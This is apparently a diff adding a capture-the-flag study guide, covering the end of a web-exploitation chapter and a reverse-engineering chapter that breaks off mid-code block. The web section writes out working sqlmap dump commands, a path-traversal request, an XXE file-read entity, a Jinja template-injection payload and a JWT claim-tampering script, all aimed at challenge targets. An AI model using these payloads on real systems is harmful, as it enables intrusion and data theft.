+| JA4/TLS fingerprints | Captured client hello and expected browser | Header ordering cannot reproduce all TLS fingerprints; prefer the intended approved browser |
+| Host/service pivots | Explicit challenge service map | Stop at the challenge boundary; organizer workstations, scoring platform, and unrelated networks are outside scope |
+
+Old cloud-takeover, CI credential-harvesting, public callback, AI-chatbot, and large-scale automation recipes are not runnable event workflows here. Their relevant trust-boundary concepts are retained above; exclusions are explained in [Excluded and advanced material](#12-excluded-and-advanced).
+
+<a id="02-web-exploitation--16-turn-a-confirmed-primitive-into-the-challenge-answer"></a>
+
+## 16. Turn a confirmed primitive into the challenge answer
+
+The diagnostics above should lead to a concrete recovery step. Use the narrowest demonstrated primitive and the flag location or table indicated by the challenge. These examples are for the assigned challenge, with your observed parameter names and current session.
+
+<a id="02-web-exploitation--confirmed-sqli-selected-flag-column"></a>
+
+### Confirmed SQLi → selected flag column
+
+**Kali only.** Start with the manually confirmed `request.txt` from section 6. Replace `challenge_db`, `flags`, and `flag_value` below with names learned in the preceding output. Preserve the technique that actually worked; `B` here means the demonstrated boolean oracle.
+
+```bash
+sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch --dbs
+sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db --tables
+sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db -T flags --columns
+sqlmap -r request.txt -p id --technique=B --level=1 --risk=1 --threads=1 --delay=1 --timeout=10 --retries=0 --batch -D challenge_db -T flags -C flag_value --dump --start=1 --stop=1
+```
+
+Expected progression: database list → selected table list → column names/types → one flag cell. If supplied source already names the table and column, skip discovery. If the first row is not the intended row, inspect the schema and use a known challenge identifier as a `--where` predicate rather than dumping unrelated data. Stop if the session expires or the oracle becomes unstable.
+
+Without sqlmap on WSL, use the confirmed boolean oracle and the binary-search logic from section 6 to recover a known column character by character, or use a visible `UNION SELECT` result. Derive the exact DBMS substring and character-code syntax from the supplied database/source, and first verify length and the first known prefix character manually.
+
+<a id="02-web-exploitation--confirmed-traversal-supplied-flag-file"></a>
+
+### Confirmed traversal → supplied flag file
+
+Suppose the supplied source says the application reads from `/app/public` and the flag is `/app/flag.txt`. After `file=welcome.txt` and the traversal boundary have been confirmed, send:
+
+```http
+GET /view?file=../flag.txt HTTP/1.1
+Host: challenge.example
+Cookie: session=YOUR_CHALLENGE_SESSION
+
+```
+
+Expected response: the actual file bytes, including the challenge flag. A literal `../flag.txt`, a generic error, or a login page is not success. If the source appends `.txt`, supply `../flag` instead. If it resolves a different base directory, calculate the path from that directory; do not blindly add dozens of `../` segments.
+
+For a confirmed XML external-entity reader with the same explicit flag path:
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE note [<!ENTITY answer SYSTEM "file:///app/flag.txt">]>
+<note>&answer;</note>
+```
+
+Submit this through the application's normal XML field or upload, preserving its required root/namespace. The result may appear in a generated document rather than the HTTP body. If the content contains characters illegal in XML, a direct text entity may fail; the failure is not permission to upload the file to an external DTD service.
+
+<a id="02-web-exploitation--confirmed-flaskjinja-evaluation-challenge-file"></a>
+
+### Confirmed Flask/Jinja evaluation → challenge file
+
+Use this only when supplied source identifies Flask/Jinja, arithmetic evaluation succeeded, the context exposes `get_flashed_messages`, and the source specifies `/app/flag.txt`. In the template-source field, the read expression is:
+
+```jinja2
+{{ get_flashed_messages.__globals__.__builtins__.open('/app/flag.txt').read() }}
+```
+
+Expected rendered output is the flag file content. This relies on a Python globals/builtins traversal and fails in a properly sandboxed or different context. If `__builtins__` is a module/dictionary or lookup behavior differs, inspect the supplied function's environment in the local reproduction rather than assuming another engine shares Jinja semantics. Let Burp encode the form field exactly once; raw braces in JSON do not need URL encoding.
+
+<a id="02-web-exploitation--confirmed-missing-jwt-verification-modified-challenge-claim"></a>
+
+### Confirmed missing JWT verification → modified challenge claim
+
+This self-contained local demonstration models the specific broken verifier that decodes a JWT payload without verifying its signature. It does not forge a valid signature. Save as `jwt_unverified_toy.py`:
+
+```python
+import base64
+import json
+
+def encode(value):
+    raw = json.dumps(value, separators=(',', ':')).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()
+
+def broken_verify(token):
+    payload = token.split('.')[1]
+    return json.loads(base64.urlsafe_b64decode(payload + '='*(-len(payload) % 4)))
+
+token = encode({'alg': 'HS256', 'typ': 'JWT'}) + '.' + encode({'sub': 'test', 'role': 'user'}) + '.invalid'
+header, payload, signature = token.split('.')
+claims = broken_verify(token)
+claims['role'] = 'admin'
+modified = header + '.' + encode(claims) + '.' + signature
+assert broken_verify(token)['role'] == 'user'
+assert broken_verify(modified)['role'] == 'admin'
+print(modified)
+```
+
+For the challenge, use your captured token and only the role/identity claim the broken verifier actually consumes. Send the modified token to the known flag endpoint, then verify the returned flag. A decoder displaying `admin` locally proves nothing about the server: a correct verifier rejects this token.
+
+<a id="02-web-exploitation--17-finish-with-a-reproducible-result"></a>
+
+## 17. Finish with a reproducible result
+
+Save a short sequence: normal baseline, minimal changed request, response evidence, and final challenge-specific result. Remove session secrets from any shared writeup. Verify the flag format and submit it through the organizer interface. If a hypothesis fails, record the reason: wrong parser, insufficient privilege, signed state, unavailable dependency, blocked network path, or noisy oracle.
+
+The source material merged here includes every file under `ctf-web/`: reconnaissance and field notes; authentication, JWT, OAuth and infrastructure; SQL and other injections; paths, uploads, templates, command execution, deserialization, SSRF and XML; browser, cache, race, protocol and Web3 patterns. The MCP guide and asynchronous fuzzer are explicitly replaced with the manual, bounded workflows above. Detailed file dispositions are in `human-guide/review/web-coverage.json`.
+
+
+---
+
+<a id="06-reverse-engineering"></a>
+
+<a id="06-reverse-engineering--reverse-engineering-turn-a-program-into-a-checkable-explanation"></a>
+
+# Reverse engineering: turn a program into a checkable explanation
+
+**Quick route:** [Short commands](#quickstart--static-reversing) · [Tool strengths and weaknesses](#tool-chooser--reverse-engineering). Use this chapter for deeper explanations.
+
+Your first deliverable is a sentence such as “the program XORs each input byte with a repeating key, rotates it, and compares the result with this table.” Once that sentence is accurate, writing a solver is usually straightforward. A decompiler's output is a hypothesis; the bytes and a repeatable run are the evidence.
+
+This chapter is for human, local analysis of supplied challenge files. The event prohibits AI assistance and public online analysis, decompilation, and compilation services. Prepared notes and scripts are expressly allowed by PDF p.7. Do not upload binaries to a comparison site. Work only on the challenge targets assigned to your team.
+
+<a id="06-reverse-engineering--1-choose-the-correct-machine-before-choosing-a-command"></a>
+
+## 1. Choose the correct machine before choosing a command
+
+The workbook describes two separate environments. A tool listed under Windows with installation location WSL is not a Windows executable and is not automatically available in Kali.
+
+| Route | Approved tools relevant here | Practical use |
+| --- | --- | --- |
+| **Windows native** | x64dbg (Windows row 40), HxD (42), Notepad++ (44), dnSpyEx (45) | PE debugging, byte inspection, managed .NET analysis |
+| **Windows WSL** | Python 3 (14), GDB (16), objdump (17), strings (18), Ghidra (29), llvm-mc (34), xxd (35) | ELF analysis, local decompilation, small scripts |
+| **Kali** | radare2 (123), Frida (53), angr (13), GCC/build tools (54), ltrace (90), strace (145), UPX (156), jadx (79), Apktool (15) | ELF triage, instrumentation, APK extraction, local practice builds |
+| **Kali, specialized** | GoReSym (62), pycdc (117), pyinstxtractor-ng (118), uncompyle6 (152), unpyc3 (153), Cutter (31), BinDiff (19) | Language and packaging specific follow-up |
+
+Kali tools were installed on a best-effort basis; operation is not guaranteed. Python 3.11's Kali row 121 records no installation information. Check the interpreter actually present before running a Python example. Windows WSL Python is the reliable workbook-backed route for the standard-library scripts below.
+
+**Windows native, PowerShell: enter the supplied WSL distribution.**
+
+```powershell
+wsl --list --verbose
+wsl
+```
+
+**Windows WSL, Bash: check the listed tools without installing anything.**
+
+```bash
+command -v python3 gdb objdump strings xxd
+python3 --version
+gdb --version
+```
+
+**Kali, Bash: check the separate tool set.**
+
+```bash
+command -v r2 rabin2 python3 frida strace ltrace gcc
+r2 -v
+python3 --version
+```
+
+If a command is missing, use a listed alternative or the other supplied environment. PDF p.5 permits non-AI libraries/plugins/dependencies in both environments, subject to [named exclusions](#competition--what-is-allowed). This chapter's core route needs no extra Python package.
+
+IDA Free and Binary Ninja Free are in the unapproved sheet. MCP servers and AI plugins are out of scope. WinDbg, Scylla/x64dbg plugins, de4dot, online decompilers, and online analysis services are also excluded by the workbook. The approved x64dbg application does not imply approval of every extension.
+
+<a id="06-reverse-engineering--2-preserve-the-file-and-identify-its-format"></a>
+
+## 2. Preserve the file and identify its format
+
+Use `chall` below for a local challenge file placed in your working directory. Keep the original untouched; make a separate copy before patching. Record its hash, format, architecture, input channel, and your first observed output.
+
+**Windows native, PowerShell:**
+
+```powershell
+Get-FileHash -Algorithm SHA256 -LiteralPath .\chall
+Copy-Item -LiteralPath .\chall -Destination .\chall.work
+Format-Hex -Path .\chall
+```
+
+**Windows WSL, Python standard library:**
+
+```bash
+python3 - <<'PY'
+from pathlib import Path
+import hashlib
+p = Path('chall')
+data = p.read_bytes()
+print('size:', len(data))
+print('sha256:', hashlib.sha256(data).hexdigest())
+print('first 32 bytes:', data[:32].hex(' '))
+PY
+```
+
+Interpret the header before running it: `7f 45 4c 46` is ELF; `4d 5a` begins a DOS/PE family file; `00 61 73 6d` is WebAssembly; ZIP containers start with `50 4b` and may be APK, JAR, HAP, or an ordinary archive. A file extension alone proves none of these. An `MZ` stub may itself contain the challenge, so do not automatically discard it.
+
+**Windows WSL:**
+
+```bash
+objdump -f chall
+objdump -x chall > headers.txt
+strings -a -t x chall > strings.txt
+python3 - <<'PY'
+from pathlib import Path
+for line in Path('strings.txt').read_text(errors='replace').splitlines():
+    if any(word in line.lower() for word in ('flag', 'correct', 'wrong', 'password', 'usage')):
+        print(line)
+PY
+```
+
+**Kali:**
+
+```bash
+file chall
+rabin2 -I chall
+rabin2 -S chall
+rabin2 -zz chall > strings.txt
+rg -in 'flag|correct|wrong|password|usage' strings.txt
+```
+
+Save full output; a filtered display is an index into it. No matching string means only that this search found none. Packed data, wide strings, runtime decoding, and a different flag format can all hide a useful string. `rabin2 -zz` reports physical and virtual addresses: a file offset is not a runtime address.
+
+| Observation | Next action | Why |
+| --- | --- | --- |
+| Plaintext candidate flag | Find references and test the candidate against the original | A decoy string is cheap to plant |
+| `strcmp`/`memcmp` imported | Find callers, then stop before the relevant call | Comparison arguments may reveal the actual check |
+| Few imports and high-entropy sections | Inspect entry point, memory allocation and writes | A loader may create the real code at runtime |
+| ELF sections rejected but program headers sensible | Inspect load segments; analyze a repaired copy only | The loader uses segments; corrupt sections can mislead tools |
+| Native architecture does not match the host | Continue statically | A foreign ELF cannot run merely because it is executable |
+| .NET metadata / CLR header | Open in native dnSpyEx | Managed methods are more informative than native startup stubs |
+
+<a id="06-reverse-engineering--3-a-complete-small-checker-to-practice-on"></a>
+
+## 3. A complete small checker to practice on
+
+This local toy accepts four bytes on standard input. It gives you a known reference for practicing strings, cross-references, decompilation, and comparison breakpoints. Save as `checker.c` using an approved editor.
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+int main(void) {
+    unsigned char input[32] = {0};
+    const unsigned char key[] = {0x31, 0x72};
+    const unsigned char expected[] = {0x61, 0x3f, 0x72, 0x3f};
+    unsigned char out[4];
+    if (!fgets((char *)input, sizeof input, stdin)) return 2;
+    size_t n = strcspn((char *)input, "\r\n");
+    if (n != 4) { puts("wrong length"); return 1; }
+    for (size_t i = 0; i < 4; i++)
+        out[i] = (unsigned char)((input[i] ^ key[i % 2]) + i);
+    if (memcmp(out, expected, 4) == 0) puts("correct");
+    else puts("wrong");
+    return 0;
+}
+```
+
+**Kali, approved GCC; local practice only:**
+
+```bash
+gcc -O0 -g -fno-builtin -o checker checker.c
+printf 'AAAA\n' | ./checker
+printf 'PLAN\n' | ./checker
+```
+
+Expected output is `wrong`, then `correct`. This compiler command is not asserted available in Windows WSL. A compiled Linux file may be inspected statically there; execution also requires a compatible loader and libc.
+
+**Windows WSL Python, or Kali with Python confirmed:**
+
+```bash
+python3 - <<'PY'
+key = bytes([0x31, 0x72])
+expected = bytes([0x61, 0x3f, 0x72, 0x3f])
+answer = bytes(((b - i) & 0xff) ^ key[i % len(key)]
+               for i, b in enumerate(expected))
+reencoded = bytes(((b ^ key[i % len(key)]) + i) & 0xff
+                  for i, b in enumerate(answer))
+assert reencoded == expected
+print(answer.decode('ascii'))
+PY
+```
+
+The output is `PLAN`. Subtraction must happen before XOR because the checker applies XOR before addition. The round-trip assertion tests the inversion, while running the original checks the input length, newline handling, and surrounding logic.
+
+<a id="06-reverse-engineering--4-follow-a-check-with-radare2-on-kali"></a>
+
+## 4. Follow a check with radare2 on Kali
+
+The following is an interactive **Kali radare2** session. `checker` is the toy above; for a real target, substitute its filename and use the names or addresses actually printed by the tool.
+
+```text
+r2 checker
+aaa
+iI
+ii
+izz~correct
+afl
+pdf @ main
+```
+
+`aaa` performs analysis; `afl` lists recognized functions; `pdf` disassembles a function. Find the call to `memcmp` and the conditional branch after it. `test eax,eax` followed by a zero/nonzero branch commonly checks a C comparison result. Follow both destinations and identify which prints `correct`. The presence of one apparent success branch does not establish that it is the final check.
+
+**Kali radare2, continue in the same session:**
+
+```text
+axt @ sym.imp.memcmp
+pdf @ main
+agf @ main
+q
+```
+
+`axt` lists incoming references; `agf` shows a function graph. If your imported name differs, copy its exact flag from `ii`. If `main` is absent, use `ie` for entry points, `afl` for candidates, and inspect the startup routine's call target. A stripped executable has fewer names, not less machine code.
+
+For a string reference, copy the **virtual address** from `izz`, then use `axt @ ADDRESS`, replacing `ADDRESS` with that number. Use `pdf @ FUNCTION` for the containing function. The placeholder is deliberately not a universal address.
+
+**Kali, save reusable static output:**
+
+```bash
+r2 -q -c 'aaa;aflj' checker > functions.json
+r2 -q -c 'aaa;pdf @ main' checker > main.asm
+r2 -q -c 'izzj' checker > strings.json
+```
+
+Do not add `-d` for static work: it starts a debug process. `-w` opens a writable file and is unnecessary for inspection. If analysis is wrong, inspect bytes with `px 32 @ ADDRESS`, disassemble a bounded region with `pd 12 @ ADDRESS`, and correct function boundaries only after checking where execution actually enters. Command meanings are documented in the [official radare2 reference card](https://book.rada.re/refcard/intro.html).
+
+For JSON, check the decoded value's type and length. A failed command can produce an empty value rather than the list you expected. A `json.loads` error may mean diagnostic output polluted stdout, not that the binary has no functions. The optional `r2pipe` library is not individually listed; batch output above needs no plugin.
+
+<a id="06-reverse-engineering--5-read-decompiled-code-without-trusting-invented-types"></a>
+
+## 5. Read decompiled code without trusting invented types
+
+**Windows WSL Ghidra:** launch the supplied Ghidra application, create a local non-shared project, import `chall`, and check the detected language, bitness, endianness, and image base before accepting analysis. Open **Search → For Strings**, select a relevant message, and follow its references into the function. Keep Listing and Decompiler panes visible together.
+
+Rename `local_28` to a factual name such as `input_buffer` only after you have identified its use. Rename an unknown function to `candidate_transform` before claiming it is AES. Set array lengths from actual bounds, distinguish a byte count from an element count, and check signed comparisons in the assembly. Save your project separately from the original file.
+
+| Decompiled appearance | Verify in instructions |
+| --- | --- |
+| `char` becomes negative | `movsx` sign-extends; `movzx` zero-extends |
+| Arithmetic looks unbounded | Register width and truncation at each store |
+| `memcmp` arguments appear missing | Calling convention, register assignments before the call, function prototype |
+| Impossible branch | Flags, unsigned versus signed jump, or earlier mutation |
+| Huge single function | Flattened dispatcher, bad boundaries, exception flow, or VM interpreter |
+| No ordinary calls | Tail jumps, return chains, callbacks, destructors, signal handlers |
+
+Ghidra in the Windows sheet is installed **in WSL**. Its presence there does not establish a Kali installation. Kali's approved radare2 provides the static fallback. `pdg` requires an r2ghidra plugin; radare2 approval alone is not proof that plugin exists. Use `pdf` immediately if it is absent. PDF p.5 allows non-AI plugins subject to named exclusions, but installation and compatibility may cost more time than this fallback.
+
+<a id="06-reverse-engineering--6-stop-immediately-before-the-comparison"></a>
+
+## 6. Stop immediately before the comparison
+
+**Windows WSL GDB, Linux x86-64 checker:**
+
+```bash
+gdb -q ./checker
+```
+
+```text
+set disassembly-flavor intel
+break main
+run
+disassemble /r main
+break memcmp
+continue
+```
+
+Enter `AAAA` when the program asks for input. At the relevant `memcmp` call, inspect arguments:
+
+```text
+info registers rdi rsi rdx rip
+x/4bx $rdi
+x/4bx $rsi
+bt
+```
+
+On Linux x86-64 System V, these registers hold the first pointer, second pointer, and length. For this toy the second buffer should be `61 3f 72 3f` and the length 4. Those bytes are **transformed expected data**, not automatically the plaintext answer. Check the call site if other library calls also hit the breakpoint.
+
+On Windows x64, the first arguments are RCX, RDX, R8, R9. On i386 cdecl they are on the stack; immediately before `call`, argument one is at `[esp]`, and at callee entry it is at `[esp+4]`. On ARM A32 use r0–r3; AArch64 uses x0–x7. Register assumptions must match the ABI, not just the CPU family.
+
+For PIE, first `start` or `starti`, inspect `info proc mappings`, and derive the runtime address from the loaded image plus the correct relative offset. With symbols, `break *main+OFFSET` is convenient; replace `OFFSET` with an instruction offset from this binary. Never copy a raw address from an earlier run with ASLR enabled. The [GDB manual](https://sourceware.org/gdb/current/onlinedocs/gdb) documents breakpoints, memory inspection, and process mappings.
+
+**Windows WSL GDB, useful follow-up commands:**
+
+```text
+nexti
+stepi
+finish
+info registers
+x/16i $pc
+x/32bx $sp
+```
+
+`nexti` steps over a call; `stepi` enters it; `finish` runs until the current frame returns. If you need to discover who changes a known byte, set `watch *(unsigned char*)ADDRESS` after replacing `ADDRESS` with the live pointer. Watchpoints are limited resources; watch the meaningful field rather than an entire megabyte.
+
+**Windows native x64dbg:** open a copy of the PE using the matching x32dbg or x64dbg executable, follow the entry point, and find the local comparison or imported comparison routine from the Symbols view. Set a breakpoint, run to it, and inspect the ABI argument registers in Dump. Use a hardware breakpoint on a changed byte when a software `INT3` breakpoint would modify self-checked code. Do not assume hardware breakpoints are invisible to the program.
+
+<a id="06-reverse-engineering--7-when-tracing-reveals-more-than-decompilation"></a>
+
+## 7. When tracing reveals more than decompilation
+
+**Kali, only for a local executable you intend to run:**
+
+```bash
+ltrace -s 256 -o library.log ./chall
+strace -f -s 256 -o syscalls.log ./chall
+rg -n 'strcmp|memcmp|open|read|write|ptrace|mprotect|execve' library.log syscalls.log
+```
+
+`ltrace` can expose imported function arguments; static linking, inlining, direct syscalls, or custom routines can hide them. `strace` shows kernel interactions, including child processes with `-f`. Neither tool proves that a missing call never occurred through another implementation. A file-open failure can reveal the expected working directory or companion filename.
+
+**Kali Frida:** use this observation-only script when the binary imports `memcmp`. Save it as `compare.js`.
+
+```javascript
+const address = Module.findGlobalExportByName('memcmp');
+if (address === null) {
+  console.log('memcmp is not exported in this process');
+} else {
+  Interceptor.attach(address, {
+    onEnter(args) {
+      const length = args[2].toUInt32();
+      if (length === 0 || length > 128) return;
+      try {
+        console.log('length=' + length);
+        console.log(hexdump(args[0], { length: length, ansi: false }));
+        console.log(hexdump(args[1], { length: length, ansi: false }));
+      } catch (error) {
+        console.log('unreadable comparison: ' + error);
+      }
+    }
+  });
+}
+```
+
+```bash
+frida -f ./chall -l compare.js
+```
+
+Enter the challenge input through the terminal as appropriate for the supplied Frida CLI. Check `frida --help` if its process/input behavior differs. If the library loads later, attach after it is mapped or observe module loading; do not silently accept “no export” as “no comparison.” The script uses the current API spelling from [Frida's JavaScript documentation](https://frida.re/docs/javascript-api/).
+
+<a id="06-reverse-engineering--8-write-down-the-transform-before-solving-it"></a>
+
+## 8. Write down the transform before solving it
+
+Use a table with one row per stage: source bytes, operation, width, key/state, destination. Keep the exact comparison direction: `transform(input) == stored` requires inversion, while `input == transform(stored)` requires forward evaluation.
+
+**Windows WSL Python; Kali after interpreter check:**
+
+```python
+def rol8(value, amount):
+    amount %= 8
+    return ((value << amount) | (value >> ((8 - amount) % 8))) & 0xff
+
+def ror8(value, amount):
+    return rol8(value, -amount)
+
+for value in range(256):
+    for amount in range(8):
+        assert ror8(rol8(value, amount), amount) == value
+print('all byte rotations round-trip')
+```
+
+For XOR, applying the same key again reverses it. For addition modulo 256, subtract and mask. Reverse a permutation with the inverse index map. For a stateful cipher, restore the complete state before testing the next candidate; reusing mutated state creates plausible-looking wrong output. A non-bijective substitution can have several preimages: retain all candidates until later constraints eliminate them.
+
+A repeated prefix hash can permit byte-by-byte search if each prefix digest is independently known. A single full cryptographic hash generally does not. A branch count or timing oracle must first show a consistent relationship to correct prefixes, with repeated baselines and randomized candidate order. Avoid treating the slowest single run as proof.
+
+<a id="06-reverse-engineering--mixed-boolean-arithmetic-expressions"></a>
+
+### Mixed Boolean-arithmetic expressions
+
+Expressions such as `(x ^ y) + 2*(x & y)` implement `x+y` at a fixed width. Simplifying them can reveal an ordinary checksum hidden in a large expression. Record the width and signedness, simplify one expression, then compare original and replacement on boundary values and many random inputs. Random agreement is a useful check, not a mathematical proof of equivalence. For small widths, exhaustive checking is stronger.
+
+**Windows WSL Python, complete 8-bit check:**
+
+```python
+for x in range(256):
+    for y in range(256):
+        original = ((x ^ y) + 2 * (x & y)) & 255
+        replacement = (x + y) & 255
+        assert original == replacement
+print('equivalent for all 8-bit pairs')
+```
+
+The source's msynth/Miasm workflow is a specialized option, not a required installed tool. The manual identity and equivalence check survive without it. Solver-backed synthesis, deobfuscation plugins, and an oracle database each have separate availability requirements.
+
+<a id="06-reverse-engineering--9-anti-analysis-preserve-the-real-semantics"></a>
+
+## 9. Anti-analysis: preserve the real semantics
+
+Start by comparing one normal run with one instrumented run using the same input. Locate the first meaningful divergence. Patching every conditional jump can make a validator print success without recovering the answer.
+
+| Evidence | Human investigation | Common wrong conclusion |
+| --- | --- | --- |
+| `ptrace`, `TracerPid`, PEB flags | Identify the exact return value or branch consumed | All anti-debugging is a single imported function |
+| Time or instruction-counter state | Determine whether time changes the key or merely gates progress | Skipping a delay preserves cryptographic state |
+| SIGILL/SIGFPE/SIGTRAP handlers | Trace handler and saved context changes | The first signal is an ordinary crash |
+| Parent and child processes | Follow both and inspect writes between them | The child on disk contains its final instructions |
+| Writes to executable pages | Dump after decoding, before erasure | A static disassembly describes every later instruction |
+| TLS callbacks / constructors / destructors | Analyze startup and teardown too | All validation occurs under `main` |
+| Stack-based call-less chaining | Follow saved frame and return pointers | No `call` instruction means no function dispatch |
+
+**Windows WSL GDB, only after proving a handler is intended:**
+
+```text
+info signals SIGILL SIGFPE SIGTRAP
+handle SIGILL nostop noprint pass
+handle SIGFPE nostop noprint pass
+set follow-fork-mode child
+set detach-on-fork off
+info inferiors
+```
+
+Do not broadly pass SIGTRAP without understanding debugger breakpoints. Signal-driven code may mutate instructions, adjust the saved PC, or switch decoding modes. For a parent that writes the child's text with `process_vm_writev`, Kali `strace -f` can expose the mechanism; exact dumped bytes may require a larger recorded string limit and careful parsing.
+
+Dump a measured interval in GDB with `dump binary memory decoded.bin START END`, replacing both addresses with mapped runtime bounds. Record the base address alongside the dump. Reimporting at address zero loses pointer relationships. Integrity checks can detect patches and software breakpoints; emulation or observing after the check may preserve more behavior than editing code.
+
+<a id="06-reverse-engineering--10-custom-vms-and-emulation"></a>
+
+## 10. Custom VMs and emulation
+
+A VM is an interpreter plus a bytecode program. Recover its state before naming every opcode: program counter, registers or operand stack, memory, flags, and input/output operations. Find the dispatch loop, log one instruction's before/after state, and build a table of operand lengths and effects. Compare two runs differing in one input byte to locate the first dependent bytecode region.
+
+**Windows WSL Python; complete tiny VM with no extra libraries:**
+
+```python
+# Opcodes: 1=load immediate, 2=XOR immediate, 3=add immediate, 4=emit, 255=halt.
+program = bytes([1, 0x61, 2, 0x31, 3, 0, 4,
+                 1, 0x3d, 2, 0x71, 3, 0, 4, 255])
+pc, accumulator = 0, 0
+output = bytearray()
+steps = 0
+while pc < len(program):
+    steps += 1
+    if steps > 100: raise RuntimeError('instruction budget exhausted')
+    at = pc
+    opcode = program[pc]
+    pc += 1
+    if opcode == 255:
+        break
+    if opcode in (1, 2, 3):
+        if pc >= len(program): raise ValueError('truncated operand')
+        operand = program[pc]
+        pc += 1
+        if opcode == 1: accumulator = operand
+        elif opcode == 2: accumulator ^= operand
+        else: accumulator = (accumulator + operand) & 255
+    elif opcode == 4:
+        output.append(accumulator)
+    else:
+        raise ValueError(f'unknown opcode {opcode} at {at}')
+    print(f'pc={at:02x} op={opcode:02x} a={accumulator:02x}')
+assert bytes(output) == b'PL'
+print(output.decode())
+```
+
+The final output is `PL`. A real VM may use variable-length instructions, encoded opcodes, channels between threads, or self-modifying bytecode. Keep program memory writable in the model when STORE can alter instructions. For concurrent interpreters, record message ordering and blocking conditions; arbitrary round-robin scheduling is not automatically equivalent.
+
+| Model | Choose it when | State you must supply |
+| --- | --- | --- |
+| Small Python interpreter | Only a handful of VM instructions matter | Exact opcode semantics and integer widths |
+| radare2 ESIL, Kali | A supported short native routine can be isolated | Registers, stack, memory, stop condition; verify instruction coverage |
+| Unicorn, conditional non-AI library | Raw foreign CPU code is the obstacle | Mapped pages, architecture/mode, registers, memory and syscall/MMIO stubs |
+| Qiling, conditional non-AI library | OS calls and filesystem behavior matter | Compatible root filesystem and accurate API behavior |
+| angr, Kali approved row 13 | Input constraints lead to a small set of branches | Input model, success/failure conditions, bounds and realistic environment |
+
+Unicorn/Qiling are not individually listed as preinstalled. Their library status does not supply missing firmware, OS images, or separate emulators. `qemu-img` approval covers disk-image tooling; it does not establish approval or installation of every `qemu-system-*` or `qemu-user-*` executable.
+
+For Unicorn, map page-aligned code and stack, use a finite instruction budget, and stop at the function's return boundary. An invalid fetch usually means a bad PC or return address; an invalid read/write often means missing data, incorrect ABI arguments, or wrong pointer width. Do not “fix” every fault by mapping zero pages: that can conceal an incorrect model.
+
+Snapshotting registers alone does not reset memory. Restore dirty pages and peripheral state between candidates. ARM Thumb needs the correct execution mode; MIPS needs endianness and delay-slot semantics; mixed x86 modes require compatible register and memory transfer. CPU emulation does not implement operating-system syscalls. MMIO reads need meaningful device behavior, such as a changing ready bit, rather than arbitrary constants.
+
+<a id="06-reverse-engineering--11-symbolic-execution-as-a-bounded-experiment"></a>
+
+## 11. Symbolic execution as a bounded experiment
+
+Use symbolic execution after you know the checker's input shape. Avoid launching unconstrained exploration over an entire GUI or runtime. A solver model reaching a success address is a candidate input; replay it through the original file before accepting it.
+
+**Kali, approved angr environment, with its Python import confirmed:**
+
+```bash
+python3 -c 'import angr, claripy; print(angr.__version__)'
+```
+
+A failed import can mean angr lives in an isolated pipx environment. Use the interpreter provided with that environment rather than assuming system Python shares its packages. If it cannot be located, continue with the byte-transform solver above.
+
+Save as `solve_checker.py`; this is specific to the complete `checker.c` example, including its four-byte input and messages.
+
+```python
+import angr
+import claripy
+
+project = angr.Project('./checker', auto_load_libs=False)
+characters = [claripy.BVS(f'c{i}', 8) for i in range(4)]
+content = claripy.Concat(*characters, claripy.BVV(b'\n'))
+stream = angr.SimFileStream(name='stdin', content=content, has_end=True)
+state = project.factory.full_init_state(args=['./checker'], stdin=stream)
+for character in characters:
+    state.solver.add(character >= 0x20, character <= 0x7e)
+manager = project.factory.simulation_manager(state)
+manager.explore(find=lambda s: b'correct\n' in s.posix.dumps(1),
+                avoid=lambda s: b'wrong' in s.posix.dumps(1), n=1000)
+if not manager.found:
+    raise SystemExit('No solution within this exploration budget; inspect states')
+answer = manager.found[0].solver.eval(claripy.Concat(*characters), cast_to=bytes)
+print(answer.decode('ascii'))
+```
+
+Expected candidate: `PLAN`. `n=1000` bounds exploration rounds, not wall-clock runtime; interrupt a stalled run rather than letting it consume the session. If a target reads argv, models a file, or requires more input, change the model accordingly. Hooks must preserve the behavior relevant to the check; replacing a hash with a success constant makes a false solver. File and stream modeling are covered in the [angr filesystem documentation](https://api.angr.io/en/v9.2.112/advanced-topics/file_system.html).
+
+<a id="06-reverse-engineering--12-language-and-platform-routes"></a>
+
+## 12. Language and platform routes
+
+| Target | Approved starting route | What to recover before solving |
+| --- | --- | --- |
+| Python `.pyc` | Kali pycdc/uncompyle6/unpyc3; WSL matching Python `dis` when available | Interpreter version, constants, nested code objects, opcode mapping |
+| PyInstaller | Kali pyinstxtractor-ng | Embedded archive, Python version, actual application module |
+| .NET | Windows native dnSpyEx | Entry method, resources, initializer, decryptor, comparison |
+| APK/DEX | Kali jadx and Apktool | Java/Kotlin entry flow, resources, native methods, ABI-specific `.so` |
+| Electron | Kali approved `asar` utility | `app.asar`, main/preload scripts, native addon boundary |
+| Go | Kali GoReSym; radare2 or WSL Ghidra | Runtime versus user functions, string pointer/length pairs, goroutines |
+| Rust | WSL Ghidra or Kali radare2 | Slice lengths, enum tags, panic paths, JSON field names |
+| Swift/Kotlin/C++ | WSL Ghidra; Kali jadx for JVM bytecode | Witness tables, coroutine state, vtables/RTTI, destructors |
+| WASM / exotic bytecode | Local bytes, strings, small interpreter | Linear memory, imports, instruction encoding, host interaction |
+| Godot/Roblox/Unity | Inspect supplied assets and scripts first | Resource container, script format, engine/native boundary |
+| Firmware / drivers | Kali radare2; WSL Ghidra, binwalk where appropriate | Architecture, load address, entry point, device interfaces |
+
+These are investigation routes, not claims that every specialized decompiler is installed. Flutter/IL2CPP, HarmonyOS ABC, Pyarmor, macOS/iOS, SGX, and proprietary game formats may require tooling absent from the approved list. Preserve the structural reasoning; use approved static tools and challenge-provided resources, or defer that route.
+
+**Kali APK, static extraction:**
+
+```bash
+jadx -d jadx-out challenge.apk
+apktool d challenge.apk -o apk-out
+rg -n 'native |loadLibrary|RegisterNatives|flag|secret|check' jadx-out apk-out
+```
+
+When Java calls `native check(...)`, locate the corresponding `lib/<abi>/*.so`. Dynamic registration maps method names and signatures to native function pointers. Android `.so` files may depend on bionic, JNI objects, initialization, and ARM instructions; loading one into desktop Linux with `ctypes.CDLL` is not a general substitute for an Android runtime. Certificates, assets, or logged values can be key material; reproduce exact hashing and byte encodings.
+
+**Kali UPX, work on a copy:**
+
+```bash
